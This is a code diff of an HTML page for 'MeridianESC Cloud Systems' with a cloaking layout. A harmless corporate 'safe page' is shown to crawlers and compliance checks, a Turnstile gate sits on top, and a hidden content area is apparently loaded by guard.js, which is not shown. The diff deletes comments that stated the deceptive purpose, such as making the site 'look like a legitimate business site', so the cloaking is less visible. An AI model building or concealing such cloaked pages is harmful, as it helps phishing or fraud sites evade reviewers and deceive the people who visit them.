@@ -4,15 +4,14 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MeridianESC Cloud Systems</title>
-    <link rel="stylesheet" href="/style.css"> <!-- Absolute path for sub-folder support -->
-    <!-- Allow indexing to look like a legitimate business site -->
+    <link rel="stylesheet" href="/style.css">
+    
     <meta name="robots" content="index, follow">
     <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
 </head>
 <body class="locked">
     <div id="app">
         
-        <!-- 1. Safe Page / Compliance Content (High Quality Corporate Template) -->
         <div id="safe-content">
             <header>
                 <div class="logo">MeridianESC Cloud Systems</div>
@@ -74,10 +73,9 @@
             </footer>
         </div>
 
-        <!-- 2. Security Overlay (The only thing Humans interact with) -->
         <div class="gate-overlay">
             <div class="gate-box">
-                <!-- Turnstile Widget Container -->
+                
                 <div id="captcha-container" style="min-height: 65px; margin: 10px auto;"></div>
             </div>
         </div>
@@ -85,7 +83,6 @@
         <main id="secure-content" class="hidden"></main>
     </div>
 
-    <!-- Security Logic -->
-    <script src="/guard.js" type="module"></script> <!-- Absolute path for sub-folder support -->
+    <script src="/guard.js" type="module"></script>
 </body>
 </html>
